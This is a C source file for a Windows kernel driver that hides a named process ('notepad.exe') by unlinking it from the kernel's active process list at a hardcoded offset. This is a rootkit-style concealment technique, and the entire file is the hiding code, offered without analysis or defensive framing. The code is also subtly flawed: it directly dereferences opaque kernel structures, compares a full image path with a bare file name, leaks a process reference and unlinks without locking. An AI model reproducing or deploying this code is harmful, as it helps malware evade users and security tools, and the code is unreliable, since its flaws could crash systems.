#include <ntddk.h>
#include <ntifs.h>
#include <ntstrsafe.h>

// Function declarations
NTSTATUS FindProcessIdByName(_In_ PCWSTR ProcessName, _Out_ HANDLE* ProcessId);
NTSTATUS HideProcess(HANDLE ProcessID);
BOOLEAN IsTargetProcess(PEPROCESS Process, PCUNICODE_STRING TargetProcessName);

// Target process details
const WCHAR* g_TargetProcessName = L"notepad.exe"; // Use a global variable name to avoid shadowing
HANDLE g_TargetProcessID = NULL; // Global variable for target process ID

// Unload routine
VOID NTAPI UnloadDriver(_In_ PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("Driver unloaded\n");
}

// Get offset of ActiveProcessLinks
ULONG GetActiveProcessLinkOffset() {
    return 0x448; // Adjust this offset according to the OS version as needed
}

// Hide the process by removing it from the active process list
NTSTATUS HideProcess(HANDLE ProcessID) {
    PEPROCESS Process;
    PLIST_ENTRY ActiveProcessLink;
    NTSTATUS Status;

    // Look up the process by its ID
    Status = PsLookupProcessByProcessId(ProcessID, &Process);
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    // Get the offset of ActiveProcessLinks
    ULONG Offset = GetActiveProcessLinkOffset();
    ActiveProcessLink = (PLIST_ENTRY)((PUCHAR)Process + Offset);

    // Remove the process from the active process list
    RemoveEntryList(ActiveProcessLink);

    return STATUS_SUCCESS;
}

// Check if the given process matches the target process name
BOOLEAN IsTargetProcess(PEPROCESS Process, PCUNICODE_STRING TargetProcessName) {
    PUNICODE_STRING ProcessName;
    NTSTATUS Status = SeLocateProcessImageName(Process, &ProcessName);
    if (NT_SUCCESS(Status)) {
        BOOLEAN IsEqual = RtlEqualUnicodeString(ProcessName, TargetProcessName, TRUE);
        ExFreePool(ProcessName); // Free the memory allocated for the name
        return IsEqual;
    }
    return FALSE;
}

// Function to find process ID by process name
NTSTATUS FindProcessIdByName(_In_ PCWSTR ProcessName, _Out_ HANDLE* ProcessId) {
    PEPROCESS Process;
    UNICODE_STRING TargetProcessName;
    RtlInitUnicodeString(&TargetProcessName, ProcessName);

    // Iterate through the process list
    for (PLIST_ENTRY ListEntry = PsInitialSystemProcess->ActiveProcessLinks.Flink;
        ListEntry != &PsInitialSystemProcess->ActiveProcessLinks;
        ListEntry = ListEntry->Flink) {

        Process = CONTAINING_RECORD(ListEntry, EPROCESS, ActiveProcessLinks);

        if (IsTargetProcess(Process, &TargetProcessName)) {
            *ProcessId = PsGetProcessId(Process);
            return STATUS_SUCCESS;
        }
    }

    return STATUS_NOT_FOUND;
}

// Driver entry function
extern "C" NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
) {
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = UnloadDriver;

    // Find process ID by process name
    NTSTATUS status = FindProcessIdByName(g_TargetProcessName, &g_TargetProcessID);
    if (NT_SUCCESS(status)) {
        // Hide the process
        status = HideProcess(g_TargetProcessID);
        if (NT_SUCCESS(status)) {
            DbgPrint("Process %ws successfully hidden!\n", g_TargetProcessName);
        }
        else {
            DbgPrint("Failed to hide process %ws\n", g_TargetProcessName);
        }
    }
    else {
        DbgPrint("Could not find process %ws\n", g_TargetProcessName);
    }

    return STATUS_SUCCESS;
}
